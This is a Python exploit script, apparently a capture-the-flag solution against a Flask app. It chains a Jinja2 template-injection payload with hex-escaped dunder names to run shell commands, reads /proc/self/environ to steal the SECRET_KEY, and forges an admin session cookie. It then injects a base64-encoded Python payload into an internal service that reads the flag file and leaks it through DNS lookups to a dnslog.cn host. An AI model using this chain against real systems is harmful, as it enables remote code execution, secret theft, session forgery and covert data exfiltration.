from flask.sessions import TaggedJSONSerializer
from itsdangerous import URLSafeTimedSerializer
import requests
import base64
import hashlib

url = "http://localhost:8033/calculate"

# get secret key for session
while True:
    px = f"</b> dan <b>=cat /proc/self/environ"
    response = requests.request("POST", url + "?" + px, data={
        "name1": '{{request|attr("application")|attr("\\x5f\\x5fglobals\\x5f\\x5f")|attr("\\x5f\\x5fgetitem\\x5f\\x5f")("\\x5f\\x5fbuiltins\\x5f\\x5f")|attr("\\x5f\\x5fgetitem\\x5f\\x5f")("\\x5f\\x5fimport\\x5f\\x5f")("os")|attr("popen")(request|attr("args")|attr("get")("',
        "name2": '"))|attr("read")()}}'
    })
    if "SECRET_KEY" in response.text:
        break
secret_key = response.text.split("SECRET_KEY=")[1].split("HOME=")[0]
salt = "cookie-session"
serializer = TaggedJSONSerializer()
signer_kwargs = {
    'key_derivation': 'hmac',
    'digest_method': hashlib.sha1
}
serializer = URLSafeTimedSerializer(secret_key, salt=salt, serializer=serializer, signer_kwargs=signer_kwargs)
session_cookie = serializer.dumps({"admin": True})

# get flag
dnslog = "1ya1mf.dnslog.cn" # http://www.dnslog.cn/
p = f'import re, glob, socket; f=open(glob.glob("/flag*")[0]).read(); d=re.search(r"{{(.*)}}", f).group(1); socket.gethostbyname(d+".{dnslog}")'
p64 = str(base64.b64encode(p.encode()).decode())
norway_ip = "103.193.208.1"
xx = f"""import requests;r = requests.post("http://internal_app:5000/log",data={{"name1":"x|echo -n {p64} | base64 -d | python","name2":"%23","mtch":"%23"}},headers={{"X-Forwarded-For":"{norway_ip}","Cookie":"session={session_cookie}"}}); print(r.text)"""
px = f"</b> dan <b>=python3 -c '{xx}'"
while True:
    response = requests.request("POST", url + "?" + px, data={
        "name1": '{{request|attr("application")|attr("\\x5f\\x5fglobals\\x5f\\x5f")|attr("\\x5f\\x5fgetitem\\x5f\\x5f")("\\x5f\\x5fbuiltins\\x5f\\x5f")|attr("\\x5f\\x5fgetitem\\x5f\\x5f")("\\x5f\\x5fimport\\x5f\\x5f")("os")|attr("popen")(request|attr("args")|attr("get")("',
        "name2": '"))|attr("read")()}}'
    })
    if "Logged" in response.text: break

# check dnslog for flag, dont forget to wrap with ARKAV{} because we remove it before with re.search